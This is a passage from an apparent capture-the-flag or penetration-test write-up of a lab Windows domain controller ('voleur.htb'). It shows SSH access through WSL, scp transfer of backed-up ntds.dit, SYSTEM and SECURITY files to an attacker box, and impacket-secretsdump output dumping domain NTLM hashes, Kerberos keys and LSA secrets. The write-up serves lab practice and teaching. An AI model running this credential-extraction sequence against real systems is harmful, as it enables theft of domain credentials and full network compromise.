</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-20348-Microsoft x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Sun Jul  <span style="color:#ae81ff">6</span> 13:41:33 PDT <span style="color:#ae81ff">2025</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:    0.52      Processes:             <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>  Usage of /home: unknown   Users logged in:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Memory usage:   49%       IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.196.199
</span></span><span style="display:flex;"><span>  Swap usage:     1%
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">363</span> updates can be installed immediately.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">257</span> of these updates are security updates.
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Thu Jan <span style="color:#ae81ff">30</span> 04:26:24 <span style="color:#ae81ff">2025</span> from 127.0.0.1
</span></span><span style="display:flex;"><span> * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                         <span style="color:#f92672">[</span> OK <span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>svc_backup@DC:~$ cd /mnt/c/IT/Third-Line<span style="color:#ae81ff">\ </span>Support/Backups
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active<span style="color:#ae81ff">\ </span>Directory/
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24592</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup     <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">30</span> 03:49 .
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup     <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">30</span> 08:11 ..
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup <span style="color:#ae81ff">25165824</span> Jan <span style="color:#ae81ff">30</span> 03:49 ntds.dit
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup    <span style="color:#ae81ff">16384</span> Jan <span style="color:#ae81ff">30</span> 03:49 ntds.jfm
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ file ntds.dit 
</span></span><span style="display:flex;"><span>ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x34ab375f, page size 8192, Windows version 10.0
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd ..
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry/
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">17952</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup     <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">30</span> 03:49 .
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup     <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">30</span> 08:11 ..
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup    <span style="color:#ae81ff">32768</span> Jan <span style="color:#ae81ff">30</span> 03:30 SECURITY
</span></span><span style="display:flex;"><span>-rwxrwxrwx <span style="color:#ae81ff">1</span> svc_backup svc_backup <span style="color:#ae81ff">18350080</span> Jan <span style="color:#ae81ff">30</span> 03:30 SYSTEM
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SECURITY
</span></span><span style="display:flex;"><span>SECURITY: MS Windows registry file, NT/2000 or above
</span></span><span style="display:flex;"><span>svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SYSTEM
</span></span><span style="display:flex;"><span>SYSTEM: MS Windows registry file, NT/2000 or above
</span></span></code></pre></td></tr></table>
</div>
</div><p>The successful SSH connection confirmed the presence of Windows Subsystem for Linux (WSL) on the domain controller. This configuration allowed Linux-based tools and scripts to run on the Windows system, providing additional administrative capabilities but also creating new attack vectors.</p>
<p><strong>WSL Environment:</strong> Ubuntu 20.04 LTS on Windows</p>
<p>The WSL environment provided access to the Windows file system through the <code>/mnt/c/</code> mount point. The backup folder contained critical system files that would normally be inaccessible to standard users, representing a significant security exposure.</p>
<p><strong>Critical Backups Found:</strong></p>
<ul>
<li><strong>Active Directory/</strong> (ntds.dit, ntds.jfm)</li>
<li><strong>registry/</strong> (SYSTEM, SECURITY)</li>
</ul>
<p>The discovery of Active Directory database files (ntds.dit) and registry hives (SYSTEM, SECURITY) represented the most critical finding of the entire penetration test. These files contain all domain user password hashes and system secrets.</p>
<p><strong>6.2 File Transfer</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# scp -P <span style="color:#ae81ff">2222</span> -i id_rsa svc_backup@10.129.196.199:<span style="color:#e6db74">&#34;/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit&#34;</span> .
</span></span><span style="display:flex;"><span>ntds.dit                           100%   24MB   2.5MB/s   00:09                                 
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# scp -P <span style="color:#ae81ff">2222</span> -i id_rsa svc_backup@10.129.196.199:<span style="color:#e6db74">&#34;/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY&#34;</span> .        
</span></span><span style="display:flex;"><span>SECURITY                           100%   32KB 189.5KB/s   00:00    
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# scp -P <span style="color:#ae81ff">2222</span> -i id_rsa svc_backup@10.129.196.199:<span style="color:#e6db74">&#34;/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM&#34;</span> .  
</span></span><span style="display:flex;"><span>SYSTEM                             100%   18MB   3.0MB/s   00:05    
</span></span></code></pre></td></tr></table>
</div>
</div><p>The file transfer operation utilized SCP (Secure Copy Protocol) to extract the critical backup files. The ability to access these files through the WSL environment bypassed normal Windows security controls and audit mechanisms.</p>
<p><strong>6.3 Domain Hash Extraction</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping cached domain logon information <span style="color:#f92672">(</span>domain/username:hash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping LSA Secrets
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> $MACHINE.ACC 
</span></span><span style="display:flex;"><span>$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
</span></span><span style="display:flex;"><span>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DPAPI_SYSTEM 
</span></span><span style="display:flex;"><span>dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
</span></span><span style="display:flex;"><span>dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NL$KM 
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0000</span>   <span style="color:#ae81ff">06</span> 6A DC 3B AE F7 <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">91</span>  <span style="color:#ae81ff">73</span> 0F 6C E0 <span style="color:#ae81ff">55</span> FE A3 FF   .j.;..4.s.l.U...
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0010</span>   <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">90</span> 0A E7 C6 <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">08</span> 5A D0 1E A5 BB D2 <span style="color:#ae81ff">37</span>   01.......Z.....7
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0020</span>   <span style="color:#ae81ff">61</span> C3 FA 0D AF C9 <span style="color:#ae81ff">94</span> 4A  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">66</span> 0A AC   a......J.uS.Ff..
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0030</span>   D8 <span style="color:#ae81ff">99</span> 1F D3 BE <span style="color:#ae81ff">53</span> 0C CF  6E 2A 4E <span style="color:#ae81ff">74</span> F2 E9 F2 EB   .....S..n*Nt....
</span></span><span style="display:flex;"><span>NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit 
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\m</span>arie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\l</span>acey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\j</span>eremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys from ntds.dit 
</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:459d836b9edcd6b0
</span></span><span style="display:flex;"><span>DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
</span></span><span style="display:flex;"><span>DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
</span></span><span style="display:flex;"><span>DC$:des-cbc-md5:64e05b6d1abff1c8
</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:34ae31d073f86d20
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:des-cbc-md5:4376f7917a197a5b
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\m</span>arie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\m</span>arie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\m</span>arie.bryant:des-cbc-md5:cdf1492604d3a220
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\l</span>acey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\l</span>acey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\l</span>acey.miller:des-cbc-md5:6eef922076ba7675
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
</span></span><span style="display:flex;"><span>voleur.htb<span style="color:#ae81ff">\s</span>vc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
